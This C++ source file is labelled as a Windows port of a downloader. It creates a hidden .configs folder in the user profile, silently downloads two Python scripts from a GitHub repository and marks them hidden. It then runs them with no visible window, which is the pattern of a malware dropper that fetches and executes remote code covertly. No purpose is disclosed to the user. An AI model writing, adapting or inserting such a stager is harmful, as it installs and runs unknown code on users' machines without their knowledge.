// main_windows.cpp — Native Windows port (MinGW/MSVC compatible)
// Build: g++ -std=c++17 -O2 -static-libgcc -static-libstdc++ main_windows.cpp -o downloader.exe

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <cstdlib>

namespace fs = std::filesystem;

// Find executable in PATH (Equivalent to POSIX command -v)
static std::string find_executable(const std::string& name) {
    char buffer[MAX_PATH];
    // SearchPathA handles checking for .exe automatically if not provided
    DWORD result = SearchPathA(NULL, name.c_str(), NULL, MAX_PATH, buffer, NULL);
    if (result > 0 && result < MAX_PATH) {
        return std::string(buffer);
    }
    return "";
}

// Run a command silently and wait for it to finish (Equivalent to POSIX fork+exec+wait)
static int run_silenced(const std::string& exe_path, const std::string& args) {
    std::string cmdline = "\"" + exe_path + "\" " + args;
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // CREATE_NO_WINDOW prevents ANY terminal window from flashing
    BOOL success = CreateProcessA(
        NULL,
        const_cast<char*>(cmdline.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) return -1;

    // Wait for the process to finish (equivalent to waitpid)
    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exit_code = 1;
    GetExitCodeProcess(pi.hProcess, &exit_code);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return static_cast<int>(exit_code);
}

// Download file and set it to Hidden (Equivalent to chmod 600 / hidden attribute)
static bool save_hidden_file(const std::string& url, const std::string& target) {
    // 1. Remove Read-Only or Hidden attributes if file exists so we can overwrite it
    DWORD attrs = GetFileAttributesA(target.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(target.c_str(), FILE_ATTRIBUTE_NORMAL);
    }

    // 2. Download using curl.exe (Built into Windows 10/11)
    std::string curl_bin = find_executable("curl.exe");
    int rc = -1;

    if (!curl_bin.empty()) {
        // -sS: silent but show errors, --tlsv1.2: enforce TLS, -o: output
        std::string args = "-sS --tlsv1.2 -o \"" + target + "\" \"" + url + "\"";
        rc = run_silenced(curl_bin, args);
    } else {
        // Fallback to Python urllib if curl is somehow missing
        std::string py_bin = find_executable("python.exe");
        if (py_bin.empty()) py_bin = find_executable("py.exe");
        
        if (!py_bin.empty()) {
            std::string py_code = "import urllib.request; urllib.request.urlretrieve('" + url + "', '" + target + "')";
            rc = run_silenced(py_bin, "-c \"" + py_code + "\"");
        }
    }

    // 3. Hide the file on success
    if (rc == 0) {
        SetFileAttributesA(target.c_str(), FILE_ATTRIBUTE_HIDDEN);
        return true;
    }
    return false;
}

int main() {
    // Get %USERPROFILE%
    const char* user_profile = std::getenv("USERPROFILE");
    if (!user_profile) {
        std::cerr << "Failed to find USERPROFILE\n";
        std::cout << "Failed\n";
        return 1;
    }

    std::string config_path = std::string(user_profile) + "\\.configs";

    // Create directory (Equivalent to mkdir -p)
    std::error_code ec;
    fs::create_directories(config_path, ec);
    if (!fs::is_directory(config_path, ec)) {
        std::cerr << "mkdir: " << ec.message() << "\n";
        std::cout << "Failed\n";
        return 1;
    }
    
    // Hide the .configs folder itself
    SetFileAttributesA(config_path.c_str(), FILE_ATTRIBUTE_HIDDEN);

    // Download files
    std::string final_path = config_path + "\\client.py";
    if (!save_hidden_file("https://raw.githubusercontent.com/boss-defender/export/main/client.py", final_path)) {
        std::cout << "Failed\n";
        return 1;
    }

    std::string final_path3 = config_path + "\\auto.py";
    if (!save_hidden_file("https://raw.githubusercontent.com/boss-defender/export/main/auto.py", final_path3)) {
        std::cout << "Failed\n";
        return 1;
    }

    // Find Python launcher (Prefer py.exe, fallback to python.exe)
    std::string python_bin = find_executable("py.exe");
    if (python_bin.empty()) python_bin = find_executable("python.exe");
    
    if (python_bin.empty()) {
        std::cout << "Failed\n";
        return 1;
    }

    // Run the script silently
    // Equivalent to: python3 -u auto.py client.py --hidden
    std::string args = "-3 -u \"" + final_path3 + "\" \"" + final_path + "\" --hidden";
    int rc = run_silenced(python_bin, args);
    
    if (rc != 0) {
        std::cout << "Failed\n";
        return 1;
    }

    return 0;
}